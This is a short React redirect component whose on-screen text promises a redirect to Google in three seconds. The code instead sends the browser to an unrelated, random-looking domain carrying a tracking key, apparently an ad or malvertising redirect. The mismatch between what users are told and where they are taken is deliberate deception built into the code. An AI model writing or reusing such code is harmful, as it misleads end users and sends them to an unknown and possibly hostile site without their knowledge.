import React, { useEffect } from 'react';

const RedirectComponent = () => {
  useEffect(() => {
    // Đặt timeout để điều hướng sau 3 giây
    const timer = setTimeout(() => {
      window.location.href = 'https://abdicatebirchcoolness.com/zybg77jbb?key=0db27c22cd10202766cd5c5858cffa88';
    }, 3000);

    return () => clearTimeout(timer);
  }, []);

  return (
    <div>
      <p>You will be redirected to Google in 3 seconds...</p>
    </div>
  );
};

export default RedirectComponent;
